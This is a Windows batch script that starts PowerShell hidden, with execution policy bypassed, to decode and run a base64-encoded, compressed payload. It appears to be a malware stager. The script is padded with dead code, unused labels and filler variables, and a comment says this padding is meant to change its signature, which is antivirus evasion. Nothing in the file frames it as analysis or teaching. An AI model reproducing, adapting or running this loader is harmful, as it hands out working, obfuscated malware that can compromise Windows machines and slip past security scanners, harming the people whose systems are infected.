@echo off
REM Build marker: 2026-02-01-A
:: This is meant to change it's signature – do not remove
IF NOT DEFINED THIS_VAR_WILL_NEVER_EXIST (
    REM unreachable
)
SET /A 1+1 >nul
FOR %%X IN () DO (
    ECHO never
)
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbbtswDH33VxCGgdqIbTiXbkOKAr0hW4AtK5piewjy4Chso1WWDIlO4nb599Gts61FNwzzy5El8pwjkgoEHMOJ780ulBoXpbEU+ndoNap+L10q5UdzKKuFkgIc5cSAW+JzGGu6JAtfpKUqV6dKGRG2e5sYKqkJti3WLd5HR/+tc24xJ7xeMSz3OlXLu47hl3K7+k273WnU/ROPbP0QOL70BDfJ58U3FATT2hEW6QQpnRpxh+RahHD2ytnpcmnRuVFeSFXPh0MWQMsBG2PvYngt4wmv6xI5fEp8ieL1wEtryAij2tBrUUZe4NJzozUbDQ+6b3tpv5v2BmkvO4hhwF8E38FUlOhKqSMISr7a7NTavHH2VLWx5pJqgaG/qAl9Tos4cMuBTH2FAuUaw6B8QXTP55kX1P/ANzuTxBbXaLkQjW3DJen3mDPOos5ho1bPsnlDuD0beZuVVAghKySK/p4cwUPjpPPcah0H953DuBv/udYjld86ZpsYjRHsvBtjWVEed9mLZF2EQbPqdFiBzQWycbene+HoPdIZX9SFM56oORv5kOulwoizku585wXEuTwUSdM1SAosFmgv8EZqSdJoCAQkk7xA8L9K3e/5kGj+c2UuEB53RpUWTaSDpMydo5WtmgYdBzQcPntgWRzU6UfUt7SKs20/yzKGQRZ5e+dXlSZZYPo4kqacol1LgS79lFu3ylXTQlPWTQUh4749PY15GGzTfdmjKIafIjx8tO96+/ZYMQ62cQPZ84mZUm4pmSrEEpIpCqOX8O7NIMt2Iiexetj9AA==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbbtswDH33VxCGgdqIbTiXbkOKAr0hW4AtK5piewjy4Chso1WWDIlO4nb599Gts61FNwzzy5El8pwjkgoEHMOJ780ulBoXpbEU+ndoNap+L10q5UdzKKuFkgIc5cSAW+JzGGu6JAtfpKUqV6dKGRG2e5sYKqkJti3WLd5HR/+tc24xJ7xeMSz3OlXLu47hl3K7+k273WnU/ROPbP0QOL70BDfJ58U3FATT2hEW6QQpnRpxh+RahHD2ytnpcmnRuVFeSFXPh0MWQMsBG2PvYngt4wmv6xI5fEp8ieL1wEtryAij2tBrUUZe4NJzozUbDQ+6b3tpv5v2BmkvO4hhwF8E38FUlOhKqSMISr7a7NTavHH2VLWx5pJqgaG/qAl9Tos4cMuBTH2FAuUaw6B8QXTP55kX1P/ANzuTxBbXaLkQjW3DJen3mDPOos5ho1bPsnlDuD0beZuVVAghKySK/p4cwUPjpPPcah0H953DuBv/udYjld86ZpsYjRHsvBtjWVEed9mLZF2EQbPqdFiBzQWycbene+HoPdIZX9SFM56oORv5kOulwoizku585wXEuTwUSdM1SAosFmgv8EZqSdJoCAQkk7xA8L9K3e/5kGj+c2UuEB53RpUWTaSDpMydo5WtmgYdBzQcPntgWRzU6UfUt7SKs20/yzKGQRZ5e+dXlSZZYPo4kqacol1LgS79lFu3ylXTQlPWTQUh4749PY15GGzTfdmjKIafIjx8tO96+/ZYMQ62cQPZ84mZUm4pmSrEEpIpCqOX8O7NIMt2Iiexetj9AA==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
:unused_label_01
ECHO Dead code >nul
SET __UNUSED_VAR__=hash_variant_07
IF 0==1 (
    ECHO This will never execute
)
IF 0==3 (
    ECHO This will never execute
)
CALL :EOF
